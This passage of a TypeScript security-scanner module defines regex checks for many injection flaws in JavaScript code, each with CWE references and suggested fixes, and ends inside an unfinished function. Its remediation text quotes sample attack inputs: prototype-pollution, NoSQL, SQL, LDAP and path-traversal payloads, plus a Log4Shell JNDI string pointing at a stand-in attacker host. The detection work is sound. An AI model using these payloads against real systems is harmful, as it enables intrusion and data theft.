/**
 * Deep injection class enforcement — covers attack vectors not detected by existing checks.
 * CWE references per MITRE CWE catalog; ATT&CK techniques per MITRE ATT&CK v14.
 */
import { Finding, sanitizeErrorMessage } from "../result.js";
import { searchRepo } from "../../repo/search.js";

const NON_CODE_RE = /\.(?:md|json|yaml|yml|txt|rst|toml|lock)$/i;

type Hit = { file: string; line: number; preview: string };

function toEvidence(hits: Hit[]): string[] {
  return hits.slice(0, 10).map((m) => `${m.file}:${m.line}:${m.preview}`);
}
function toFiles(hits: Hit[]): string[] {
  return [...new Set(hits.slice(0, 10).map((m) => m.file))];
}

async function codeSearch(query: string): Promise<Hit[]> {
  return (await searchRepo({ query, isRegex: true, maxMatches: 200 })).filter(
    (h) => !NON_CODE_RE.test(h.file)
  );
}

async function checkXxe(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:new\s+(?:DOMParser|SAXParser|XMLParser|fxp\.XMLParser)|xml2js\.parseString|fast-xml-parser|libxmljs\.parseXml|parseXML)\s*\(`
  );
  const unsafe = hits.filter(
    (h) => !/entityExpansion\s*:\s*false|processEntities\s*:\s*false|resolveEntities\s*:\s*false|FEATURE_EXTERNAL_GENERAL_ENTITIES|XMLConstants\.FEATURE_SECURE_PROCESSING/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "XXE_ENTITY_PARSING",
    title: "XML parser may process external entities (XXE — CWE-611)",
    severity: "HIGH",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "Disable external entity processing: set processEntities:false (fast-xml-parser) or resolveEntities:false (xml2js).",
      "CWE-611 / ATT&CK T1190 — XXE can leak files, SSRF, or RCE via server-side request.",
      "Example fix (fast-xml-parser): new XMLParser({ processEntities: false, ignoreAttributes: false })"
    ]
  };
}

async function checkSsti(): Promise<Finding[]> {
  const findings: Finding[] = [];

  // Pass 1: same-line detection + additional engines
  const sameLineHits = await codeSearch(
    String.raw`(?:Handlebars\.compile|ejs\.render|ejs\.compile|nunjucks\.renderString|pug\.compile|pug\.render|\.template\s*\(|Mustache\.render|mustache\.render|handlebars\.compile|swig\.render|dot\.template|consolidate\.\w+)\s*\(\s*(?:req\.|body\.|params\.|query\.|user\.|input|template|src)`
  );
  if (sameLineHits.length) {
    findings.push({
      id: "SSTI_TEMPLATE_COMPILE",
      title: "Server-side template compiled from user input (SSTI — CWE-94)",
      severity: "CRITICAL",
      evidence: toEvidence(sameLineHits),
      files: toFiles(sameLineHits),
      requiredActions: [
        "Never compile templates from user input — only render with user-controlled data as context variables.",
        "CWE-94 / ATT&CK T1059 — SSTI achieves RCE via template engine expression evaluation.",
        "Fix: precompile templates at build time; pass untrusted data only as template context, never as template source."
      ]
    });
  }

  // Pass 2: two-pass variable tracking — find assignments of user input to variables
  const assignHits = await codeSearch(
    String.raw`const\s+(\w+)\s*=\s*(?:req\.|body\.|params\.|query\.)`
  );

  if (assignHits.length) {
    const varNameRe = /const\s+(\w+)\s*=/;
    const varNames = [...new Set(
      assignHits.map((h) => { const m = varNameRe.exec(h.preview); return m ? m[1] : null; }).filter(Boolean)
    )] as string[];

    if (varNames.length) {
      const enginePattern = String.raw`(?:Handlebars\.compile|ejs\.render|ejs\.compile|nunjucks\.renderString|pug\.compile|pug\.render|mustache\.render|Mustache\.render|swig\.render|dot\.template|consolidate\.\w+|handlebars\.compile)\s*\(\s*(?:${varNames.join("|")})`;
      const varHits = await codeSearch(enginePattern);
      const newHits = varHits.filter(
        (h) => !sameLineHits.some((s) => s.file === h.file && s.line === h.line)
      );
      if (newHits.length) {
        findings.push({
          id: "SSTI_TEMPLATE_COMPILE_INDIRECT",
          title: "Server-side template compiled from variable holding user input (SSTI — CWE-94)",
          severity: "CRITICAL",
          evidence: toEvidence(newHits),
          files: toFiles(newHits),
          requiredActions: [
            "Never compile templates from user input — only render with user-controlled data as context variables.",
            "CWE-94 / ATT&CK T1059 — SSTI achieves RCE even when user input is stored in an intermediate variable.",
            "Fix: precompile templates at build time; pass untrusted data only as template context, never as template source."
          ]
        });
      }
    }
  }

  return findings;
}

async function checkPrototypePollution(): Promise<Finding[]> {
  const findings: Finding[] = [];

  // Original merge-with-user-input pattern
  const mergeHits = await codeSearch(
    String.raw`(?:_\.merge|Object\.assign|deepmerge|lodash\.merge|merge\s*\()\s*\(\s*(?:\{\}|obj|target|options|config|settings|result)\s*,\s*(?:req\.|body\.|params\.|query\.|user\.|payload\.|data\.)`
  );
  if (mergeHits.length) {
    findings.push({
      id: "PROTOTYPE_POLLUTION",
      title: "Unsafe merge of user-controlled data into plain object — prototype pollution risk (CWE-1321)",
      severity: "HIGH",
      evidence: toEvidence(mergeHits),
      files: toFiles(mergeHits),
      requiredActions: [
        "Validate with Zod/Joi schema before merging; use Object.create(null) as the merge target.",
        "CWE-1321 / ATT&CK T1548 — payload {\"__proto__\":{\"isAdmin\":true}} can pollute all objects in the process.",
        "Fix: const safe = schema.parse(req.body); Object.assign(Object.create(null), defaults, safe);"
      ]
    });
  }

  // Direct __proto__ assignment patterns
  const directProtoHits = await codeSearch(
    String.raw`(?:\.__proto__\s*=|\['__proto__'\]\s*=|\["__proto__"\]\s*=|\.constructor\.prototype\s*=)`
  );
  if (directProtoHits.length) {
    findings.push({
      id: "PROTOTYPE_POLLUTION_DIRECT",
      title: "Direct __proto__ or constructor.prototype assignment — prototype pollution (CWE-1321)",
      severity: "HIGH",
      evidence: toEvidence(directProtoHits),
      files: toFiles(directProtoHits),
      requiredActions: [
        "Never assign to __proto__ or constructor.prototype from user-controlled data.",
        "CWE-1321 — direct prototype pollution corrupts all object instances sharing the prototype chain.",
        "Fix: use Object.create(null) for maps; validate all keys with allowlists before any property assignment."
      ]
    });
  }

  // Two-pass: JSON.parse of user input → variable → Object.assign/merge
  const jsonParseHits = await codeSearch(
    String.raw`JSON\.parse\s*\([^)]*(?:req\.|body\.|params\.|query\.)[^)]*\)`
  );
  if (jsonParseHits.length) {
    const varNameRe = /(?:const|let|var)\s+(\w+)\s*=\s*JSON\.parse/;
    const varNames = [...new Set(
      jsonParseHits.map((h) => { const m = varNameRe.exec(h.preview); return m ? m[1] : null; }).filter(Boolean)
    )] as string[];

    if (varNames.length) {
      const mergePattern = String.raw`(?:Object\.assign|deepmerge|_\.merge|lodash\.merge|merge\s*\()\s*\([^)]*(?:${varNames.join("|")})`;
      const indirectHits = await codeSearch(mergePattern);
      const newHits = indirectHits.filter(
        (h) => !mergeHits.some((s) => s.file === h.file && s.line === h.line)
      );
      if (newHits.length) {
        findings.push({
          id: "PROTOTYPE_POLLUTION_JSON_PARSE",
          title: "JSON.parse of user input passed to Object.assign/merge — prototype pollution risk (CWE-1321)",
          severity: "HIGH",
          evidence: toEvidence(newHits),
          files: toFiles(newHits),
          requiredActions: [
            "Validate parsed JSON with a schema (Zod/Joi) before merging into objects.",
            "CWE-1321 — JSON.parse('{\"__proto__\":{\"isAdmin\":true}}') followed by Object.assign pollutes all objects.",
            "Fix: const safe = schema.parse(JSON.parse(req.body.data)); Object.assign(Object.create(null), defaults, safe);"
          ]
        });
      }
    }
  }

  return findings;
}

async function checkOpenRedirect(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`res\.redirect\s*\(\s*(?:req\.|body\.|params\.|query\.|headers\.|url\b|redirect|returnUrl|next|target|destination)`
  );
  const unsafe = hits.filter(
    (h) => !/allowlist|allowedHosts|isAllowed|REDIRECT_WHITELIST|validateRedirect|isSafeUrl|startsWith\s*\(['"]\/\b/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "OPEN_REDIRECT",
    title: "Open redirect — user-controlled URL in res.redirect() without allowlist (CWE-601)",
    severity: "HIGH",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "Validate redirect targets against an allowlist of trusted hosts or enforce relative-only redirects.",
      "CWE-601 / ATT&CK T1598 — open redirects are used in phishing chains and OAuth token theft.",
      "Fix: if (!url.startsWith('/') || url.startsWith('//')) throw new Error('Invalid redirect');"
    ]
  };
}

async function checkNosqlInjection(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:\.find|\.findOne|\.findOneAndUpdate|\.updateOne|\.deleteOne|\.aggregate)\s*\(\s*(?:req\.body|body\.|params\.|query\.)\b`
  );
  if (!hits.length) return null;
  return {
    id: "NOSQL_OPERATOR_INJECTION",
    title: "NoSQL query built from user input without operator stripping (CWE-943)",
    severity: "HIGH",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Never pass req.body directly into MongoDB queries — extract and validate each field individually.",
      "CWE-943 — payload {\"$gt\":\"\"} bypasses equality checks; {\"$where\":\"sleep(5000)\"} achieves DoS.",
      "Fix: const { username } = z.object({ username: z.string() }).parse(req.body); User.findOne({ username });"
    ]
  };
}

async function checkCrlfInjection(): Promise<Finding[]> {
  const findings: Finding[] = [];

  // Original: res.setHeader with user input
  const headerHits = await codeSearch(
    String.raw`res\.setHeader\s*\(\s*[^,]+,\s*(?:req\.|body\.|params\.|query\.|user\.|headers\.)`
  );
  const unsafeHeaders = headerHits.filter(
    (h) => !/replace\s*\(.*\\r|replace\s*\(.*\\n|sanitize|encodeURIComponent/.test(h.preview)
  );
  if (unsafeHeaders.length) {
    findings.push({
      id: "CRLF_INJECTION",
      title: "CRLF injection risk — user value written to HTTP response header (CWE-113)",
      severity: "HIGH",
      evidence: toEvidence(unsafeHeaders),
      files: toFiles(unsafeHeaders),
      requiredActions: [
        String.raw`Strip \r and \n from any user-controlled value before writing to response headers.`,
        "CWE-113 — CRLF injection enables HTTP response splitting, header injection, session fixation.",
        String.raw`Fix: const safe = value.replace(/[\r\n]/g, ''); res.setHeader('X-Header', safe);`
      ]
    });
  }

  // Extended: cookie, append, location, response.redirect with user input
  const extendedHits = await codeSearch(
    String.raw`(?:res\.cookie\s*\([^,]*(?:req\.|body\.|params\.|query\.)|res\.append\s*\(\s*[^,]+,\s*(?:req\.|body\.|params\.|query\.)|res\.location\s*\(\s*(?:req\.|body\.|params\.|query\.)|response\.redirect\s*\(\s*(?:req\.|body\.|params\.|query\.))`
  );
  const unsafeExtended = extendedHits.filter(
    (h) => !/replace\s*\(.*\\r|replace\s*\(.*\\n|sanitize|encodeURIComponent|allowlist|validateRedirect/.test(h.preview)
  );
  if (unsafeExtended.length) {
    findings.push({
      id: "HTTP_HEADER_INJECTION",
      title: "HTTP header/cookie injection — user value written to response cookie, header, or location (CWE-113)",
      severity: "HIGH",
      evidence: toEvidence(unsafeExtended),
      files: toFiles(unsafeExtended),
      requiredActions: [
        String.raw`Strip \r and \n from user-controlled values before writing to cookies, headers, or redirect locations.`,
        "CWE-113 / CWE-601 — header injection via CRLF enables response splitting, session fixation, and open redirect.",
        String.raw`Fix: const safe = value.replace(/[\r\n]/g, ''); res.cookie('name', safe, { httpOnly: true, secure: true });`
      ]
    });
  }

  return findings;
}

async function checkYamlUnsafeLoad(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`yaml\.load\s*\((?!.*FAILSAFE_SCHEMA)(?!.*JSON_SCHEMA)(?!.*CORE_SCHEMA)|jsYaml\.load\s*\((?!.*schema)|require\s*\(['"]js-yaml['"]\)\.load\s*\(`
  );
  if (!hits.length) return null;
  return {
    id: "YAML_UNSAFE_LOAD",
    title: "js-yaml load() without safe schema — arbitrary code execution risk (CWE-502)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Use yaml.load(str, { schema: yaml.FAILSAFE_SCHEMA }) or yaml.safeLoad() (js-yaml v3).",
      "CWE-502 — js-yaml default schema executes JS functions embedded in YAML (!!js/function).",
      "For js-yaml v4+: safeLoad was removed; use load() which is safe by default — verify version."
    ]
  };
}

async function checkUnsafeDeserialize(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:node-serialize\.unserialize|serialize\.unserialize|unserialize\s*\(|new\s+Function\s*\(\s*(?:req\.|body\.|params\.|data\.|input)|eval\s*\(\s*(?:req\.|body\.|params\.|data\.|Buffer\.from|atob\())`
  );
  if (!hits.length) return null;
  return {
    id: "DESERIALIZE_UNSAFE",
    title: "Unsafe deserialization of user input (CWE-502)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Never deserialize untrusted data with node-serialize, eval(), or new Function().",
      "CWE-502 / ATT&CK T1059 — deserialization gadget chains achieve RCE without user interaction.",
      "Fix: use JSON.parse() with a Zod schema for structured data; for binary formats use a safe decoder with a strict schema."
    ]
  };
}

async function checkPathTraversal(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`path\.(?:join|resolve)\s*\([^)]*(?:req\.|body\.|params\.|query\.|filename|filepath|file_path|filePath|fileName)[^)]*\)`
  );
  const unsafe = hits.filter(
    (h) => !/normalize|startsWith|indexOf\s*\(base|resolve.*startsWith|\.includes\s*\(['"]\.\.['"]|path\.sep/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "PATH_TRAVERSAL_JOIN",
    title: "Path traversal — path.join() with user input without prefix verification (CWE-22)",
    severity: "HIGH",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "After path.join(), verify the resolved path starts with the intended base directory.",
      "CWE-22 / ATT&CK T1083 — ../../etc/passwd reads arbitrary files on the server.",
      "Fix: const full = path.resolve(BASE_DIR, userFilename); if (!full.startsWith(BASE_DIR + path.sep)) throw new Error('Invalid path');"
    ]
  };
}

async function checkLogInjection(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:console\.(?:log|warn|error|info)|logger\.(?:log|warn|error|info|debug)|log\.(?:info|warn|error|debug))\s*\([^)]*(?:req\.|body\.|params\.|query\.|headers\.|user\.|username|email|ip\b)`
  );
  const unsafe = hits.filter(
    (h) => !/replace\s*\(.*\\n|replace\s*\(.*\\r|sanitize|JSON\.stringify|inspect\s*\(/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "LOG_INJECTION",
    title: "Log injection — user-controlled string written to logs without newline sanitization (CWE-117)",
    severity: "MEDIUM",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      String.raw`Strip or encode \n and \r from user-controlled values before logging.`,
      "CWE-117 — log injection forges log entries, erasing evidence of attacks or injecting false audit trails.",
      String.raw`Fix: logger.info('Login attempt', { username: username.replace(/[\r\n]/g, '_') });`
    ]
  };
}

async function checkSsrfUserUrl(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:fetch|axios\.(?:get|post|put|delete|request)|https?\.(?:get|request)|got\s*\(|needle\.(?:get|post)|superagent\.(?:get|post))\s*\(\s*(?:req\.|body\.|params\.|query\.|url\b|webhook|endpoint|target|callback|proxy)`
  );
  const unsafe = hits.filter(
    (h) => !/allowedHosts|SSRF_GUARD|validateUrl|isAllowedUrl|new URL.*hostname|URL_ALLOWLIST/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "SSRF_USER_URL",
    title: "SSRF — HTTP request to user-controlled URL without allowlist (CWE-918)",
    severity: "CRITICAL",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "Validate the URL hostname against an explicit allowlist before making server-side HTTP requests.",
      "CWE-918 / ATT&CK T1090 — SSRF reaches 169.254.169.254 for cloud metadata, internal services, and localhost.",
      "Fix: const { hostname } = new URL(userUrl); if (!ALLOWED_HOSTS.includes(hostname)) throw new Error('Blocked');"
    ]
  };
}

async function checkCommandInjection(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:exec|execSync|spawn|spawnSync|execFile|execFileSync)\s*\(\s*(?:['"][^'"]*\$\{|req\.|body\.|params\.|query\.|input\b|cmd\b|command\b|shell\b)|shell\s*:\s*true`
  );
  const unsafe = hits.filter(
    (h) => !/allowedCommands|COMMAND_ALLOWLIST|execFile\s*\(\s*['"][^'"]+['"]\s*,\s*\[/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "COMMAND_INJECTION",
    title: "Command injection — child_process called with user-controlled input or shell:true (CWE-78)",
    severity: "CRITICAL",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "Use execFile() with a static path and an array of validated arguments — never string concatenation.",
      String.raw`CWE-78 / ATT&CK T1059 — command injection achieves full OS compromise via shell metacharacters (;, |, $(), \n).`,
      "Fix: execFile('/usr/bin/convert', ['-resize', validatedSize, inputFile, outputFile], { shell: false });"
    ]
  };
}

async function checkRedos(): Promise<Finding[]> {
  const findings: Finding[] = [];

  // Original: new RegExp from user input
  const dynHits = await codeSearch(
    String.raw`new\s+RegExp\s*\(\s*(?:req\.|body\.|params\.|query\.|user\.|input\b|pattern\b|search\b|filter\b)`
  );
  if (dynHits.length) {
    findings.push({
      id: "REDOS_USER_REGEXP",
      title: "ReDoS — user-controlled input used to construct RegExp — catastrophic backtracking (CWE-1333)",
      severity: "HIGH",
      evidence: toEvidence(dynHits),
      files: toFiles(dynHits),
      requiredActions: [
        "Never construct RegExp from user input. Escape with escape-string-regexp, or use string.includes() / startsWith().",
        "CWE-1333 / ATT&CK T1499 — a crafted pattern like (a+)+ causes exponential backtracking that hangs the Node.js event loop.",
        "Fix: const safe = escapeStringRegexp(userInput); const re = new RegExp(safe);"
      ]
    });
  }

  // Static regex with catastrophic backtracking patterns applied to user input
  const staticReHits = await codeSearch(
    String.raw`\/(?:[^\/]*\([^)]*[+*][^)]*\)[+*][^\/]*|[^\/]*\([^)]*[+*][^)]*\)\{[0-9,]+\}[^\/]*|[^\/]*(?:a\|aa|a\+b|\w\+\s\*)[^\/]*)[+*?]?\/[gimsuy]*\s*\.\s*(?:test|match|exec)\s*\(\s*(?:req\.|body\.|params\.|query\.)`
  );
  if (staticReHits.length) {
    findings.push({
      id: "REDOS_STATIC_PATTERN",
      title: "ReDoS — static regex with catastrophic backtracking pattern applied to user input (CWE-1333)",
      severity: "HIGH",
      evidence: toEvidence(staticReHits),
      files: toFiles(staticReHits),
      requiredActions: [
        "Audit regex for nested quantifiers (e.g. (a+)+, (\\w+\\s*)+, (a|aa)+) — these cause exponential backtracking.",
        "CWE-1333 / ATT&CK T1499 — a malicious input string can hang the Node.js event loop for seconds per request.",
        "Fix: use a safe regex library (re2) or rewrite the pattern to eliminate ambiguity; add an input length limit."
      ]
    });
  }

  return findings;
}

async function checkJsonpCallbackInjection(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`res\.(?:send|end|write)\s*\(\s*(?:req\.|query\.|params\.)(?:callback|jsonp|cb)\s*\+`
  );
  if (!hits.length) return null;
  return {
    id: "JSONP_CALLBACK_INJECTION",
    title: "JSONP callback parameter reflected without validation — XSS via function name (CWE-79)",
    severity: "HIGH",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Validate the callback parameter against /^[a-zA-Z_$][a-zA-Z0-9_$.]*$/ before reflecting it in a JSONP response.",
      "CWE-79 — an unvalidated callback like alert(document.cookie) is executed when the browser loads the JSONP response.",
      String.raw`Fix: Remove JSONP and use CORS instead. If JSONP is required: if (!/^[\w$.]+$/.test(cb)) return res.status(400).end();`,
    ]
  };
}

async function checkEvalEncodedPayload(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`eval\s*\(\s*(?:atob|Buffer\.from[^)]*base64|decode|decodeURIComponent)\s*\(`
  );
  if (!hits.length) return null;
  return {
    id: "EVAL_ENCODED_PAYLOAD",
    title: "eval() with decoded/deserialized payload — obfuscated code execution (CWE-95)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Remove eval() entirely. Use JSON.parse() for structured data; import() with a static specifier for modules.",
      "CWE-95 / ATT&CK T1027 — base64-encoding evades naive static analysis; eval executes arbitrary JavaScript.",
      "Fix: const data = JSON.parse(Buffer.from(encoded, 'base64').toString('utf-8')); // never eval()"
    ]
  };
}

// ─── NEW CHECKS ──────────────────────────────────────────────────────────────

async function checkSqlInjection(): Promise<Finding[]> {
  const findings: Finding[] = [];

  // Direct SQL keyword + template literal interpolation
  const templateSqlHits = await codeSearch(
    String.raw`(?:SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|EXEC(?:UTE)?|UNION|TRUNCATE)[^'";\n]*\$\{`
  );
  if (templateSqlHits.length) {
    findings.push({
      id: "SQL_INJECTION",
      title: "SQL injection — SQL keyword with template literal interpolation (CWE-89)",
      severity: "CRITICAL",
      evidence: toEvidence(templateSqlHits),
      files: toFiles(templateSqlHits),
      requiredActions: [
        "Never interpolate user input into SQL strings. Use parameterized queries or prepared statements exclusively.",
        "CWE-89 / ATT&CK T1190 — SQL injection enables authentication bypass, data exfiltration, and database destruction.",
        "Fix: db.query('SELECT * FROM users WHERE id = $1', [userId]) or use an ORM with parameterized inputs."
      ]
    });
  }

  // SQL keyword + string concatenation with user input
  const concatSqlHits = await codeSearch(
    String.raw`(?:SELECT|INSERT|UPDATE|DELETE)[^'";\n]*['"]\s*\+\s*(?:req\.|body\.|params\.|query\.|\w+Id\b|\w+Name\b)`
  );
  if (concatSqlHits.length) {
    findings.push({
      id: "SQL_INJECTION_CONCAT",
      title: "SQL injection — SQL query built via string concatenation with user input (CWE-89)",
      severity: "CRITICAL",
      evidence: toEvidence(concatSqlHits),
      files: toFiles(concatSqlHits),
      requiredActions: [
        "Replace string concatenation in SQL queries with parameterized queries or prepared statements.",
        "CWE-89 / ATT&CK T1190 — ' OR '1'='1 via string concatenation bypasses authentication entirely.",
        "Fix: use db.query('SELECT * FROM users WHERE name = ?', [name]) — never string concatenation."
      ]
    });
  }

  // ORM raw query escape hatches
  // Note: $queryRaw/`...` is a safe Prisma tagged template (parameterized automatically).
  // Only flag the function-call form $queryRaw( which bypasses the tagged-template safety guarantee.
  const ormRawHits = await codeSearch(
    String.raw`(?:\$queryRaw\s*\(|\$executeRaw\s*\(|sequelize\.query\s*\(|Sequelize\.literal\s*\(|knex\.raw\s*\(|\.query\s*\(\s*[\x60'"][^\x60'"]*\$\{)`
  );
  if (ormRawHits.length) {
    findings.push({
      id: "ORM_RAW_INJECTION",
      title: "ORM raw query escape hatch — potential SQL injection via Prisma/Sequelize/Knex raw (CWE-89)",
      severity: "CRITICAL",
      evidence: toEvidence(ormRawHits),
      files: toFiles(ormRawHits),
      requiredActions: [
        "Use ORM parameterized APIs: Prisma.sql tagged template, sequelize query with replacements array, knex bindings.",
        "CWE-89 — $queryRaw with template literals or Sequelize.literal() bypass ORM query sanitization.",
        "Fix (Prisma): prisma.$queryRaw`SELECT * FROM User WHERE id = ${userId}` — always use Prisma.sql or tagged template."
      ]
    });
  }

  // TypeORM createQueryBuilder .where() with template literal
  const typeormHits = await codeSearch(
    String.raw`createQueryBuilder\(\)[^;]*\.where\s*\(\s*[\x60'"][^\x60'"]*\$\{`
  );
  if (typeormHits.length) {
    const existingOrmFiles = new Set(ormRawHits.map((h) => h.file));
    const newHits = typeormHits.filter((h) => !existingOrmFiles.has(h.file));
    if (newHits.length) {
      findings.push({
        id: "ORM_RAW_INJECTION_TYPEORM",
        title: "TypeORM createQueryBuilder with interpolated .where() clause — SQL injection risk (CWE-89)",
        severity: "CRITICAL",
        evidence: toEvidence(newHits),
        files: toFiles(newHits),
        requiredActions: [
          "Use TypeORM parameterized .where('field = :param', { param: value }) — never template literals in .where().",
          "CWE-89 — template literal interpolation in TypeORM .where() bypasses query parameterization.",
          "Fix: .where('user.id = :id', { id: userId }) instead of .where(`user.id = ${userId}`)."
        ]
      });
    }
  }

  return findings;
}

async function checkMongoAggregationInjection(): Promise<Finding | null> {
  // Search for .aggregate() calls in the same files as dangerous operators
  const aggregateHits = await codeSearch(
    String.raw`\.aggregate\s*\(\s*\[`
  );
  const dangerousOpHits = await codeSearch(
    String.raw`\$where|\$function|\$accumulator`
  );

  const aggregateFiles = new Set(aggregateHits.map((h) => h.file));
  const dangerousFiles = dangerousOpHits.filter((h) => aggregateFiles.has(h.file));

  // Also check for $expr in aggregate context (inline)
  const exprHits = await codeSearch(
    String.raw`\.aggregate\s*\(\s*\[[^\]]*\$expr`
  );

  // Direct $where in .find()
  const findWhereHits = await codeSearch(
    String.raw`\.find\s*\(\s*\{[^}]*\$where`
  );

  const allHits = [...dangerousFiles, ...exprHits, ...findWhereHits];
  if (!allHits.length) return null;

  return {
    id: "NOSQL_AGGREGATE_INJECTION",
    title: "MongoDB aggregation with $where/$function/$expr/$accumulator — NoSQL injection risk (CWE-943)",
    severity: "CRITICAL",
    evidence: toEvidence(allHits),
    files: toFiles(allHits),
    requiredActions: [
      "Avoid $where, $function, and $accumulator with user-controlled data — these execute JavaScript on the MongoDB server.",
      "CWE-943 / ATT&CK T1190 — $where: 'sleep(5000)' causes DoS; $function can execute arbitrary server-side JS.",
      "Fix: replace $where with MongoDB operators ($eq, $gt, $in, etc.); if $function is required, validate all inputs strictly with Zod."
    ]
  };
}

async function checkLdapInjection(): Promise<Finding | null> {
  const ldapLibHits = await codeSearch(
    String.raw`require\s*\(\s*['"](?:ldapjs|ldapts|activedirectory)['"]\)`
  );
  if (!ldapLibHits.length) return null;

  const filterHits = await codeSearch(
    String.raw`(?:\(uid=.*req\.|filter.*\+.*req\.|dn.*\+.*req\.|searchFilter.*\+|filter\s*=\s*[\x60'"][^\x60'"]*\$\{)`
  );
  if (!filterHits.length) return null;

  return {
    id: "LDAP_INJECTION",
    title: "LDAP injection — user input concatenated into LDAP filter string (CWE-90)",
    severity: "HIGH",
    evidence: toEvidence(filterHits),
    files: toFiles(filterHits),
    requiredActions: [
      "Escape all special LDAP characters in user input: ( ) * \\ NUL and slashes before constructing filter strings.",
      "CWE-90 — LDAP injection via (*)(uid=*))(|(uid=* bypasses authentication and dumps directory contents.",
      "Fix: use ldapjs escape: const safe = ldap.searchFilterEscape(userInput); or validate input strictly before use."
    ]
  };
}

async function checkXpathInjection(): Promise<Finding | null> {
  const xpathLibHits = await codeSearch(
    String.raw`require\s*\(\s*['"]xpath['"]|xpath\.select|xpath\.evaluate|XPathEvaluator`
  );
  if (!xpathLibHits.length) return null;

  const injectionHits = await codeSearch(
    String.raw`(?:xpath.*\+.*req\.|select\s*\([^)]*req\.|evaluate\s*\([^)]*req\.|xpath\s*=\s*[\x60'"][^\x60'"]*\$\{[^\x60'"]*(?:req|body|params|query))`
  );
  if (!injectionHits.length) return null;

  return {
    id: "XPATH_INJECTION",
    title: "XPath injection — user input concatenated into XPath expression (CWE-643)",
    severity: "HIGH",
    evidence: toEvidence(injectionHits),
    files: toFiles(injectionHits),
    requiredActions: [
      "Use parameterized XPath queries or escape all XPath special characters from user input.",
      "CWE-643 — XPath injection via ' or '1'='1 bypasses authentication and exposes the full XML document.",
      "Fix: use a parameterized XPath library or strictly validate/allowlist all user values used in XPath expressions."
    ]
  };
}

async function checkJndiInjection(): Promise<Finding[]> {
  const findings: Finding[] = [];

  // Direct JNDI lookup strings in code — CRITICAL
  const jndiLiteralHits = await codeSearch(
    String.raw`\$\{jndi:`
  );
  if (jndiLiteralHits.length) {
    findings.push({
      id: "LOG4SHELL_JNDI_LITERAL",
      title: "JNDI lookup string found in codebase — Log4Shell/JNDI injection (CVE-2021-44228)",
      severity: "CRITICAL",
      evidence: toEvidence(jndiLiteralHits),
      files: toFiles(jndiLiteralHits),
      requiredActions: [
        "Remove any ${jndi: strings from code immediately — these indicate either a test payload or live attack vector.",
        "CVE-2021-44228 (Log4Shell) — JNDI lookup strings in log data trigger remote class loading and RCE.",
        "Fix: update all logging frameworks; add JNDI sanitization filter to strip ${jndi: patterns from all user input."
      ]
    });
  }

  // User input flowing into log calls without JNDI sanitization
  const logUserInputHits = await codeSearch(
    String.raw`(?:logger\.\w+|console\.log)\s*\(\s*[\x60][^\x60]*\$\{(?:req|body|params|query)\.[^\x60]*[\x60]`
  );
  const unsafeLogHits = logUserInputHits.filter(
    (h) => !/jndi|sanitize|replace.*jndi|stripJndi|filterJndi/.test(h.preview)
  );
  if (unsafeLogHits.length) {
    findings.push({
      id: "LOG_JNDI_INJECTION_RISK",
      title: "User input interpolated into log statement — JNDI injection risk if using Java logging or proxied to Log4j (CWE-117)",
      severity: "HIGH",
      evidence: toEvidence(unsafeLogHits),
      files: toFiles(unsafeLogHits),
      requiredActions: [
        "Sanitize user input before logging — strip or encode ${jndi: patterns to prevent Log4Shell-style injection.",
        "CWE-117 / CVE-2021-44228 — user-controlled ${jndi:ldap://attacker.com/x} in logs triggers JNDI lookup and RCE.",
        String.raw`Fix: const safe = input.replace(/\$\{jndi:/gi, '[blocked:'); logger.info('Request: ' + safe);`
      ]
    });
  }

  return findings;
}

async function checkRedisEvalInjection(): Promise<Finding | null> {
  // First check if any eval-like Redis calls exist at all
  const evalHits = await codeSearch(
    String.raw`(?:\.eval\s*\(|EVAL\s+|evalsha\s*\(|EVALSHA\s*\()`
  );
  if (!evalHits.length) return null;

  // Narrow to cases where user input appears in the eval call
  const userInputHits = await codeSearch(
    String.raw`\.eval\s*\([^)]*(?:req\.|body\.|params\.|query\.)`
  );
  if (!userInputHits.length) return null;

  return {
    id: "REDIS_EVAL_INJECTION",
    title: "Redis EVAL with user-controlled input — server-side Lua injection risk (CWE-95)",
    severity: "HIGH",
    evidence: toEvidence(userInputHits),
    files: toFiles(userInputHits),
    requiredActions: [
      "Never pass user-controlled values as part of Redis EVAL Lua scripts — only pass them as KEYS or ARGV arguments.",
      "CWE-95 — Redis EVAL executes Lua on the Redis server; injection can exfiltrate data or corrupt the dataset.",
      "Fix: client.eval(STATIC_LUA_SCRIPT, numkeys, ...keys, ...argv) where argv contains user values, not the script itself."
    ]
  };
}

async function checkSecondOrderInjection(): Promise<Finding | null> {
